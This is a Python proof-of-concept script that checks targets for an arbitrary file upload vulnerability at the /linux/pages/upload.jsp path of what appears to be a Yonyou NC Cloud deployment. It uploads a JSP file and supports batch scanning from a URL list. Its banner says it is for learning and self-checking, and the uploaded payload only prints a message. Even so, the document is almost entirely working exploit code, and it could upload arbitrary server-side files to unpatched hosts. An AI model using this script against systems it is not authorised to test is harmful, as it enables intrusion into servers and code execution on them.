# _*_ coding:utf-8 _*_
# @Time : 2023/10/24 18:30
# @Author: 为赋新词强说愁
 
 
import requests
import argparse
from datetime import datetime
import time
 
requests.packages.urllib3.disable_warnings()
 
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
 
 
def usage():
    global RED_BOLD
    global RESET
    text = '''
    +-----------------------------------------------------------------+
                微信公众号    网络安全透视镜 
    此脚本仅用于学习或系统自检查
    使用方法:
        单个 python3 NC-CloudUploadCheck.py -u url[例 http://127.0.0.1:8080]
        批量 python3 NC-CloudUploadCheck.py -f filename
    +-----------------------------------------------------------------+         
    '''
    print(f"{RED_BOLD}{text}{RESET}")
 
 
# proxies = {'http':'http://127.0.0.1:10808}
 
 
def save_file(url):
    with open('result.txt', mode='a', encoding='utf-8') as f:
        f.write(url + '\n')
 
 
def poc(check_url, flag):
    now_poc = datetime.now()
    global RED_BOLD
    global RESET
    url = check_url + "/linux/pages/upload.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Cookie": "JSESSIONID=4BBA3C3DD35C4CD93F701B258F4798EA.server; JSESSIONID=89AEE247A1323DDF4E812852F345CF17.server",
        "DNT": "1",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "filename": "securityCheck.jsp",
    }
 
    data = {
        "content": '<% out.println("The website has vulnerabilities!!");%>'
    }
    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=3)
        if response.status_code == 200 and 'success' in response.text:
            print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t任意文件上传漏洞存在,上传文件路径：{check_url}/linux/securityCheck.jsp{RESET}')
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞不存在')
    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t无法访问，请检查目标站点是否存在')
 
 
def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u
 
        poc(url, flag)
 
 
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="python NC-CloudUploadCheck.py -u url")
    parse.add_argument("-f", "--file", help="python NC-CloudUploadCheck.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    usage()
    time.sleep(1)
    if url is not None and filepath is None:
        flag = 1
        poc(url, flag)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()
 
 
if __name__ == '__main__':
    main()